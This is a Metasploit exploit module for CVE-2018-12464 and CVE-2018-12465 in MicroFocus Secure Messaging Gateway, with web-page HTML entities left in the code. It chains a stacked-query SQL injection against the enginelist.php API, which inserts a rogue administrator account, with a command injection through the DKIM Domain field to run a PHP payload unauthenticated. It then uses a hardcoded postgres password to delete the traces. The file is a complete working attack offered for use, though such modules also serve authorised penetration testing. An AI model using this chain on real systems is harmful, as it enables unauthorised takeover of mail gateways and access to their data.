# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MicroFocus Secure Messaging Gateway Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a SQL injection and command injection vulnerability in MicroFocus Secure Messaging Gateway.
        An unauthenticated user can execute a terminal command under the context of the web user.

        One of the user supplied parameters of API endpoint is used by the application without input validation and/or parameter binding,
        which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a ability to add new user onto system.
        manage_domains_dkim_keygen_request.php endpoint is responsible for executing an operation system command. It&#039;s not possible
        to access this endpoint without having a valid session.

        Combining these vulnerabilities gives the opportunity execute operation system commands under the context
        of the web user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/unexpected-journey-6-all-ways-lead-to-rome-remote-code-execution-on-microfocus-secure-messaging-gateway/&#039;],
          [&#039;CVE&#039;, &#039;2018-12464&#039;],
          [&#039;CVE&#039;, &#039;2018-12465&#039;],
          [&#039;URL&#039;, &#039;https://support.microfocus.com/kb/doc.php?id=7023132&#039;],
          [&#039;URL&#039;, &#039;https://support.microfocus.com/kb/doc.php?id=7023133&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;Encoder&#039; => &#039;php/base64&#039;
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jun 19 2018",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;])
      ]
    )
  end

  def execute_query(query)
    #
    # We have a very rare SQLi case in here. Normally, it&#039;s would be very easy to exploit it by using time-based techniques
    # but since we are able to use stacked-query approach, following form of payload is required in order to be able
    # get back the output of query !
    #
    sql = rand_text_alphanumeric(3 + rand(3))
    sql << "&#039;) LEFT JOIN ScanEngineProperty AS ScanEngineBindAddressPlain ON ScanEngineBindAddressPlain.idScanEngine=ScanEngineProperty.idScanEngine "
    sql << "LEFT JOIN ScanEngineProperty AS ScanEngineBindAddressSsl ON ScanEngineBindAddressSsl.idScanEngine=ScanEngineProperty.idScanEngine "
    sql << "LEFT JOIN ScanEngineProperty AS ScanEngineEnableSsl ON ScanEngineEnableSsl.idScanEngine=ScanEngineProperty.idScanEngine; "
    sql << query
    sql << "; -- "
    sql << rand_text_alphanumeric(3 + rand(3))

    send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;api&#039;, &#039;1&#039;, &#039;enginelist.php&#039;),
      &#039;vars_post&#039; => {
        &#039;appkey&#039; => sql
      }
    )

  end

  def something_went_wrong
    fail_with Failure::Unknown, &#039;Something went wrong&#039;
  end

  def check
    r = rand_text_numeric(15..35)
    res = execute_query("SELECT #{r}")
    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end
    unless res.code == 200 && res.body.include?(r)
      return CheckCode::Safe
    end
    CheckCode::Vulnerable
  end

  def implant_payload(cookie)
    print_status(&#039;Creating a domain record with a malformed DKIM data&#039;)
    p = [
      {
        :id => &#039;temp_0&#039;,
        :Description => rand_text_alpha(5),
        :DkimList => [
          {
            :Domain => "$(php -r &#039;#{payload.encoded}&#039;)",
            :Selector => &#039;&#039;,
            :TempId => &#039;tempDkim_1&#039;
          }
        ]
      }
    ].to_json
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;contents&#039;, &#039;ou&#039;, &#039;manage_domains_save_data.json.php&#039;),
      &#039;cookie&#039; => cookie,
      &#039;vars_get&#039; => {
        &#039;cache&#039; => 0,
      },
      &#039;vars_post&#039; => {
        &#039;StateData&#039; => &#039;[{"ouid":1}]&#039;,
        &#039;SaveData&#039; => p
      }
    })

    if res && res.code == 200 && res.body.include?(&#039;DbNodeId&#039;)
      # Defining as global variable since we need to access them later within clean up function.
      begin
        @domainid  = res.get_json_document[&#039;Nodes&#039;][0][&#039;DbNodeId&#039;]
        @dkimid  = res.get_json_document[&#039;Nodes&#039;][1][&#039;DbNodeId&#039;]
      rescue => e
        fail_with Failure::UnexpectedReply, "Something went horribly wrong while implanting the payload : #{e.message}"
      end
      print_good(&#039;Payload is successfully implanted&#039;)
    else
      something_went_wrong
    end
  end

  def create_user
    # We need to create an user by exploiting SQLi flaws so we can reach out to cmd injection
    # issue location where requires a valid session !
    print_status(&#039;Creating a user with appropriate privileges&#039;)

    # Defining as global variable since we need to access them later within clean up function.
    @username = rand_text_alpha_lower(5..25)
    @userid = rand_text_numeric(6..8)
    query = "INSERT INTO account VALUES (#{@userid}, 1, &#039;#{@username}&#039;, &#039;0&#039;, &#039;&#039;, 1,61011);INSERT INTO UserRole VALUES (#{@userid},#{@userid},1),(#{@userid.to_i-1},#{@userid},2)"

    execute_query(query)
    res = execute_query("SELECT * FROM account WHERE loginname = &#039;#{@username}&#039;")

    if res && res.code == 200 && res.body.include?(@username)
      print_good("User successfully created. Username : #{@username}")
    else
      something_went_wrong
    end
  end

  def login
    print_status("Authenticating with created user")
    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;security&#039;, &#039;securitygate.php&#039;),
      &#039;vars_post&#039; => {
        &#039;username&#039; => @username,
        &#039;password&#039; => rand_text_alpha_lower(5..25),
        &#039;passwordmandatory&#039; => rand_text_alpha_lower(5..25),
        &#039;LimitInterfaceId&#039; => 1
      }
    )
    if res && res.code == 200 && res.body.include?(&#039;/ui/default/index.php&#039;)
      print_good(&#039;Successfully authenticated&#039;)
      cookie = res.get_cookies
    else
      something_went_wrong
    end
    cookie
  end

  def exploit
    unless check == CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    create_user
    cookie = login
    implant_payload(cookie)

    print_status(&#039;Triggering an implanted payload&#039;)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;contents&#039;, &#039;ou&#039;, &#039;manage_domains_dkim_keygen_request.php&#039;),
      &#039;cookie&#039; => cookie,
      &#039;vars_get&#039; => {
        &#039;cache&#039; => 0,
      },
      &#039;vars_post&#039; => {
        &#039;DkimRecordId&#039; => @dkimid
      }
    })

  end

  def on_new_session(session)
    print_status(&#039;Cleaning up...&#039;)
    cmd = ""
    cmd << &#039;PGPASSWORD=postgres psql -U postgres -d SecureGateway -c "&#039;
    cmd << "DELETE FROM account WHERE loginname =&#039;#{@username}&#039;;"
    cmd << "DELETE FROM UserRole WHERE idaccount = #{@userid};"
    cmd << "DELETE FROM Domain WHERE iddomain = #{@domainid};"
    cmd << "DELETE FROM DkimSignature WHERE iddkimsignature = #{@dkimid};"
    cmd << &#039;"&#039;
    session.shell_command_token(cmd)
  end

end

